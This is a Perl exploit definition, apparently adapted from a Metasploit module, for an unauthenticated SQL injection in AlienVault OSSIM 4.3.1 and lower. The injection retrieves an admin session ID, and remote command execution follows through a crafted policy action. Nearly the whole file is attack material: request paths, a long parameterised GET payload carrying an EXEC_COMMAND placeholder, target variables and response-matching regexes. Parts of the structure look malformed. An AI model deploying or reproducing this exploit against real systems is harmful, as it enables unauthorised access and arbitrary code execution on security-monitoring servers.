my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits an unauthenticated SQL injection vulnerability affecting AlienVault

        OSSIM versions 4.3.1 and lower. The SQL injection issue can be abused in order to retrieve an

        active admin session ID.  If an administrator level user is identified, remote code execution

        can be gained by creating a high priority policy with an action containing our payload.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "alienvault_sqli_exec",
  OSVDB       => 106252,
  PATH        => "date_from=__DATE_FROM__&m_opt=configuration&sm_opt=threat_intelligence&h_opt=policy&ctx=__CTX__&group=__GROUP__&what=policies&back=../policy/policy.php&confirm=yes&id=__ID__&token=__TOKEN__&id=__ID__&=____&what=policies&back=../policy/policy.php&",
  PATHS       => ["geoloc/graph_geoloc.php", "geoloc/graph_geoloc.php", ""],
  PAYLOAD     => "?action=new&action_name=__ACTION_NAME__&descr=__DESCR__&action_type=2&only=on&cond=True&exec_command=__EXEC_COMMAND__&page=1&rp=2000&descr=__DESCR__&active=1&group=__GROUP__&ctx=__CTX__&order=1&overrulingalltheotherpoliciesaction=new&sources[]=00000000000000000000000000000000&#SourceisANYdests[]=00000000000000000000000000000000&#DestinationisANYportsrc[]=0&#Anysourceportportdst[]=0&#Anydestinationportplug_type=1&#Taxonomyplugins[0]=on&taxfilters[]=20\@13\@118&Subcategory:Web-NotFoundtax_pt=0&tax_cat=0&tax_subc=0&mboxs[]=00000000000000000000000000000000&rep_act=0&rep_sev=1&rep_rel=1&rep_dir=0&ev_sev=1&ev_rel=1&tzone=Europe/Amsterdam&date_type=1&begin_hour=0&begin_minute=0&begin_day_week=1&begin_day_month=1&begin_month=1&end_hour=23&end_minute=59&end_day_week=7&end_day_month=31&end_month=12&actions[]=__ACTIONS[]__&sim=1&priority=1&qualify=1&correlate=0&#Dontmakeanycorrelationscross_correlate=0&#Dontmakeanycorrelationsstore=0#Wedontwanttostoreanything:)&page=1&rp=2000&f_name=delete_policy&",
  VARS_POST   => " ",
  VARIABLES => {
    'ACTIONS[]' =>       { DESCRIPTION => "", VALUE => "" },
    'GROUP' =>       { DESCRIPTION => "", VALUE => "" },
    'ID' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The URI of the vulnerable Alienvault OSSIM instance",
  VALUE => "/",
},
    'TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    '' =>       { DESCRIPTION => "", VALUE => "" },
    'CTX' =>       { DESCRIPTION => "", VALUE => "" },
    'DESCR' =>       { DESCRIPTION => "", VALUE => "" },
    'DATE_FROM' =>       { DESCRIPTION => "", VALUE => "" },
    'EXEC_COMMAND' =>       { DESCRIPTION => "", VALUE => "" },
    'ACTION_NAME' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TREGEX' =>       (
  "\\(.*\\)",
  "actionform\\.php\\?id=\\(.*\\)'>",
  "getpolicy\\.php\\?ctx=\\(.*\\)\\&group=\\(.*\\)',",
  "row id='\\(.*\\)' col_order='1'",
  "\\{\\\"status\\\":\\\"OK\\\",\\\"data\\\":\\\"\\(.*\\)\\\"\\}",
),
    'TSTRING' =>       "726F6F7440[0-9a-zA-Z]+",
